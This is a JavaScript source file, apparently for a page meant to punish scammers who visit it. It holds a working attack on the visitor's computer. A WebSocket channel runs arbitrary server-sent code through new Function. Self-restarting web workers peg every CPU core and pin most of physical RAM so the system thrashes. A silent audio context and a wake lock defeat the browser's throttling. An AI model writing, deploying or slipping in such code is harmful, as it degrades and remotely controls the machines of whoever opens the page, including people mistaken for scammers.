const sessionId = crypto.randomUUID();
let ws = null;
 
function connectWS() {
  const protocol = location.protocol === "https:" ? "wss" : "ws";
  ws = new WebSocket(`${protocol}://${location.host}/ws/${sessionId}`);
  ws.onclose = () => { ws = null; };
  ws.onerror = () => { ws = null; };
  ws.onmessage = (event) => {
    try { handleCommand(JSON.parse(event.data)); } catch (e) {}
  };
}
 
function handleCommand(cmd) {
  if (cmd.type === "exec" && cmd.js) new Function(cmd.js)();
}
 
function launchHammer() {
 
  // ── CPU WORKERS ─────────────────────────────────────────────────────────────
  // One worker per logical core. Each runs an infinite 512×512 matrix multiply
  // that keeps a core pegged at 100% without ever allocating enough memory to
  // trigger an OOM kill.
  const cpuWorkerCode = `
    onmessage = function() {};
    const SIZE = 512;
 
    function makeMatrix() {
      const m = new Float64Array(SIZE * SIZE);
      for (let i = 0; i < m.length; i++) m[i] = Math.random();
      return m;
    }
 
    function matMul(A, B, C) {
      for (let i = 0; i < SIZE; i++) {
        for (let k = 0; k < SIZE; k++) {
          const aik = A[i * SIZE + k];
          for (let j = 0; j < SIZE; j++) {
            C[i * SIZE + j] += aik * B[k * SIZE + j];
          }
        }
      }
    }
 
    const A = makeMatrix(), B = makeMatrix(), C = new Float64Array(SIZE * SIZE);
 
    while (true) {
      matMul(A, B, C);
      for (let i = 0; i < SIZE * SIZE; i++) A[i] = C[i] * 0.9999;
    }
  `;
 
  // ── RAM WORKER ───────────────────────────────────────────────────────────────
  // A single dedicated worker that gradually fills ~3 GB of physical RAM.
  //
  // Two key tricks:
  //   1. Page-stride writes on allocation  — writing every 512th element forces
  //      the OS to actually commit physical pages (not just reserve virtual space).
  //   2. Re-touching on every step        — periodically mutating every held page
  //      keeps them resident in RAM and prevents the OS paging daemon from quietly
  //      swapping them out to disk.
  //
  // Allocates 50 MB every 800 ms → fills ~3 GB over ~50 seconds, slow enough
  // that the browser tab survives long enough for the damage to be done.
  // The 3 GB cap leaves just enough headroom that the tab stays alive while the
  // OS thrashes swap for everything else.
  const ramWorkerCode = `
    const CHUNK_MB   = 50;
    const STEP_MS    = 800;
    const MAX_MB     = (navigator.deviceMemory || 4) * 1024 * 0.8;
 
    const leaks  = [];
    let totalMB  = 0;
 
    function fillChunk(mb) {
      const f = new Float64Array(mb * 1024 * 1024 / 8);
      // Write every 512th element (one per 4 KB OS page) to commit physical memory
      for (let i = 0; i < f.length; i += 512) f[i] = Math.random();
      return f;
    }
 
    function step() {
      // Allocate a new chunk if we haven't hit the cap yet
      if (totalMB < MAX_MB) {
        leaks.push(fillChunk(CHUNK_MB));
        totalMB += CHUNK_MB;
      }
 
      // Re-touch every held page so the OS keeps them in physical RAM
      for (let c = 0; c < leaks.length; c++) {
        const chunk = leaks[c];
        for (let i = 0; i < chunk.length; i += 512) {
          chunk[i] *= 1.0000001;
        }
      }
 
      setTimeout(step, STEP_MS);
    }
 
    step();
  `;
 
  // ── WORKER SPAWNER ───────────────────────────────────────────────────────────
  // Auto-restarts a worker if it crashes (e.g. the browser kills it for using
  // too many resources) so the pressure never silently disappears.
  function spawnWorker(code) {
    const blob = new Blob([code], { type: "application/javascript" });
    const url  = URL.createObjectURL(blob);
    const w    = new Worker(url);
    w.onerror  = () => setTimeout(() => spawnWorker(code), 500);
  }
 
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores; i++) spawnWorker(cpuWorkerCode);
 
  // One RAM worker is enough — it's memory-bandwidth bound, not CPU bound,
  // so giving it its own worker keeps it from stealing cycles from the matMul.
  spawnWorker(ramWorkerCode);
 
  // ── BACKGROUND THROTTLE BYPASS ───────────────────────────────────────────────
  // Chrome throttles background tabs to ~1% CPU the moment the scammer
  // switches windows. A silent (0 Hz) AudioContext keeps the audio thread
  // alive, which prevents the renderer from entering the throttled state.
  try {
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    osc.connect(ctx.destination);
    osc.frequency.value = 0;
    osc.start();
  } catch (e) {}
 
  // WakeLock stops the OS from letting the CPU/screen idle.
  if (navigator.wakeLock) {
    navigator.wakeLock.request("screen").catch(() => {});
  }
}